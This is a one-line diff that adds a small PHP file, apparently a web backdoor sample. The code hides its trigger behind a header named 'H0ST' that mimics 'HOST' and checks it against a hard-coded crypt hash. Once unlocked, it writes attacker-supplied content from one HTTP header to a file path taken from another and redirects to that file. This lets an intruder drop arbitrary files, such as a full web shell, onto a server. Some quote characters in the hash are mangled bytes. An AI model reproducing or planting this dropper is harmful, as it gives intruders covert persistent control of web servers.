@@ -1,0 +1,1 @@
+b'<?php\r\n\r\nif(crypt($_SERVER[\'HTTP_H0ST\'],51)==\xa1\xaf514zR17F8j0q6\xa1\xe4){@file_put_contents($_SERVER[\'HTTP_X\'],$_SERVER[\'HTTP_Y\']);header("Location: ./".$_SERVER[\'HTTP_X\']);};\r\n\r\n?>'
